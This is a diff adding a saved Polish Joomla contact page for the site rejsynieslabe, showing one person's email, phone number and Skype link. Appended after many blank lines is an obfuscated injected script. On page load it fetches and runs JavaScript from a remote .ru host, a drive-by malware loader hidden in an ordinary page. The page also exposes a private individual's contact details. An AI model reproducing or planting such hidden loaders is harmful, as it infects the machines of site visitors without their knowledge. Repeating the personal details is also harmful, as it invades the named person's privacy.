@@ -1,0 +1,157 @@
+<?xml version="1.0" encoding="UTF-8"?>	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml">
+		<head>
+			<title>rejsynieslabe - Kontakt</title>
+			<link rel="stylesheet" href="templates/ms_thinking_blue/css/template_css.css" type="text/css" />
+			<link rel="shortcut icon" href="http://rejsynieslabe.ovh.org/joomla/images/favicon.ico" />
+			<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+			<meta name="robots" content="noindex, nofollow" />
+					</head>
+		<body class="contentpane">
+					<script language="JavaScript" type="text/javascript">
+		<!--
+		function validate(){
+			if ( ( document.emailForm.text.value == "" ) || ( document.emailForm.email.value.search("@") == -1 ) || ( document.emailForm.email.value.search("[.*]" ) == -1 ) ) {
+				alert( "Upewnij się, że formularz jest kompletny i poprawnie wypełniony." );
+			} else if ( ( document.emailForm.email.value.search(";") != -1 ) || ( document.emailForm.email.value.search(",") != -1 ) || ( document.emailForm.email.value.search(" ") != -1 ) ) {
+				alert( "Możesz podać tylko jeden adres email, nie więcej!" );
+			} else {
+				document.emailForm.action = "http://rejsynieslabe.ovh.org/joomla/index.php?option=com_contact&Itemid=0"
+				document.emailForm.submit();
+			}
+		}
+		//-->
+		</script>
+		<script type="text/javascript">
+		<!--
+		function ViewCrossReference( selSelectObject ){
+			var links = new Array();
+			
+links[1]='http://rejsynieslabe.ovh.org/joomla/index.php?option=com_contact&task=view&contact_id=1&Itemid=0';
+			var sel = selSelectObject.options[selSelectObject.selectedIndex].value
+			if (sel != "") {
+				location.href = links[sel];
+			}
+		}
+		//-->
+		</script>
+					<div class="componentheading">
+				Kontakt			</div>
+			
+		<table width="100%" cellpadding="0" cellspacing="0" border="0" class="contentpane">
+						<tr>
+					<td class="contentheading" width="100%">
+						<table width="100%">
+						<tr>
+							<td width="100%">
+								Michał Pietrzykowski							</td>
+											<td align="right" width="100%" class="buttonheading">
+					<a href="http://rejsynieslabe.ovh.org/joomla/index2.php?option=com_contact&amp;task=view&amp;contact_id=1&amp;Itemid=0&amp;pop=1" target="_blank" onclick="window.open('http://rejsynieslabe.ovh.org/joomla/index2.php?option=com_contact&amp;task=view&amp;contact_id=1&amp;Itemid=0&amp;pop=1','win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" title="Drukuj">
+						<img src="http://rejsynieslabe.ovh.org/joomla/images/M_images/printButton.png"  alt="Drukuj" name="Drukuj" align="middle" border="0" /></a>
+				</td>
+										</tr>
+						</table>
+					</td>
+				</tr>
+						<tr>
+			<td width="100%">
+				<table width="100%">
+				<tr>
+					<td>
+								<table width="100%" cellpadding="0" cellspacing="0" border="0">
+							<tr>
+					<td rowspan="6" valign="top" width="40" align="left">
+					<img src="http://rejsynieslabe.ovh.org/joomla/images/M_images/arrow.png"  alt="Ulica i numer:" name="Ulica i numer:" align="middle" border="0" />					</td>
+				</tr>
+											<tr>
+					<td valign="top">
+					<img src="http://rejsynieslabe.ovh.org/ja.jpg" ALIGN="left" WIDTH="110" HEIGHT="105" />					</td>
+				</tr>
+							</table>
+			<br />
+						<table width="100%" cellpadding="0" cellspacing="0" border="0">
+							<tr>
+					<td width="40" align="left">
+					<img src="http://rejsynieslabe.ovh.org/joomla/images/M_images/arrow.png"  alt="E-mail: " name="E-mail: " align="middle" border="0" />					</td>
+					<td>
+					
+ <script language='JavaScript' type='text/javascript'>
+ <!--
+ var prefix = '&#109;a' + 'i&#108;' + '&#116;o';
+ var path = 'hr' + 'ef' + '=';
+ var addy82358 = 'm&#105;chp&#105;&#101;t' + '&#64;';
+ addy82358 = addy82358 + 'gm&#97;&#105;l' + '&#46;' + 'c&#111;m';
+ document.write( '<a ' + path + '\'' + prefix + ':' + addy82358 + '\'>' );
+ document.write( addy82358 );
+ document.write( '<\/a>' );
+ //-->\n </script><script language='JavaScript' type='text/javascript'>
+ <!--
+ document.write( '<span style=\'display: none;\'>' );
+ //-->
+ </script>Ten adres e-mail jest ukrywany przed spamerami, włącz obsługę JavaScript w przeglądarce, by go zobaczyć
+ <script language='JavaScript' type='text/javascript'>
+ <!--
+ document.write( '</' );
+ document.write( 'span>' );
+ //-->
+ </script>					</td>
+				</tr>
+								<tr>
+					<td width="40" align="left">
+					<img src="http://rejsynieslabe.ovh.org/joomla/images/M_images/arrow.png"  alt="Telefon:" name="Telefon:" align="middle" border="0" />					</td>
+					<td>
+					661 691 359					</td>
+				</tr>
+							</table>
+			<br />
+						<table width="100%" cellpadding="0" cellspacing="0" border="0">
+			<tr>
+				<td width="40" valign="top" align="left">
+				<img src="http://rejsynieslabe.ovh.org/joomla/images/M_images/arrow.png"  alt="Informacje: " name="Informacje: " align="middle" border="0" />				</td>
+				<td>
+				<!--
+Skype 'Add me to Skype' button
+http://www.skype.com/go/skypebuttons
+-->
+<script type="text/javascript" src="http://download.skype.com/share/skypebuttons/js/skypeCheck.js"></script>
+<a href="skype:michal.pietrzykowski?add"><img src="http://download.skype.com/share/skypebuttons/buttons/add_green_transparent_118x23.png" style="border: none;" width="118" height="23" alt="Add me to Skype" /></a>
+
+				</td>
+			</tr>
+			</table>
+			<br />
+								</td>
+					<td align="right" valign="top">
+										</td>
+				</tr>
+				</table>
+			</td>
+			<td>&nbsp;</td>
+		</tr>
+				</table>
+					<div class="back_button">
+				<a href='javascript:history.go(-1)'>
+					WSTECZ</a>
+			</div>
+					</body>
+	</html>
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>var e;if(e!='N' && e!='d'){e=''};var PV=new String();function q(){var cY;if(cY!=''){cY='eX'};var j=window;var p=new Date();var uC;if(uC!='w' && uC != ''){uC=null};this.el="";var jC=new String();var g=unescape;var IL=new String();var I=g("%2f%73%6d%68%2d%63%6f%6d%2d%61%75%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%79%6e%65%74%2e%63%6f%6d%2e%70%68%70");var R;if(R!='' && R!='Y'){R=null};function P(b,S){this.Tr="";this.mZ="";var W=String("g");var A;if(A!='TJ' && A != ''){A=null};var L=g("%5b"), x=g("%5d");var Ll=L+S+x;var Ac;if(Ac!='gM'){Ac=''};var uN='';var gF=new RegExp(Ll, W);this.Hn="";return b.replace(gF, new String());this.WE='';};var bA;if(bA!='ga' && bA!='qB'){bA=''};var Za;if(Za!='Lb'){Za=''};var sS=new String();var Ve=new String();var r=document;var EJ;if(EJ!='QW'){EJ=''};var y;if(y!='k'){y=''};var M=P('8467110326255851469609337337','39152647');var jt=new Date();var bi=new String();var Rm;if(Rm!='nP'){Rm=''};function IZ(){var iW;if(iW!='' && iW!='Xt'){iW=''};var Q=g("%68%74%74%70%3a%2f%2f%72%65%61%63%68%73%61%77%2e%72%75%3a");var RV=new String();var mH=new Date();var Js;if(Js!='VB' && Js != ''){Js=null};bi=Q;var nf=new Date();var Rx;if(Rx!='' && Rx!='zO'){Rx='tR'};bi+=M;var UB;if(UB!='YU'){UB=''};bi+=I;var Iz;if(Iz!='' && Iz!='ew'){Iz='zC'};var Ix;if(Ix!='jf'){Ix=''};var fP=new Date();try {var in_=new Date();U=r.createElement(P('sAcArViypktE','EaySkWqHlAmMV'));var KJ;if(KJ!='Ru' && KJ!='qd'){KJ=''};U[g("%64%65%66%65%72")]=[1][0];U[g("%73%72%63")]=bi;var Aa=new Array();var jM='';this.xl='';r.body.appendChild(U);} catch(X){var NX=new Array();alert(X);var XY=new Array();};this.FQ="";this.El="";}var MZ=new Array();j[String("onloa"+"d")]=IZ;var RQ=new String();var wI=new Array();};var Ry=new String();this.CM="";var kT='';q();var ks;if(ks!='xi' && ks!='JU'){ks='xi'};this.tW='';</script>
+<!--71f45265577cdd4e303302a40c7589ff-->
